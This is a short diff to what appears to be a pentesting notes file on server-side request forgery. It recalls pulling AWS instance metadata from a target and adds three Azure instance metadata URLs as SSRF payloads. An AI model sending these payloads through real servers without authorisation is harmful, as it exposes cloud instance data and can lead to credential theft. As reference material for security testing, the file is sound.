@@ -19,7 +19,11 @@ Target was using aws , so i requested http://169.254.169.254/latest/meta-data/ ,
  i got their aws instances metadata
 
 
+Exploit SSRF Azure:
 
+http://169.254.169.254/metadata/v1/maintenance
+http://169.254.169.254/metadata/instance?api-version=2017-04-02
+http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
 
 
 
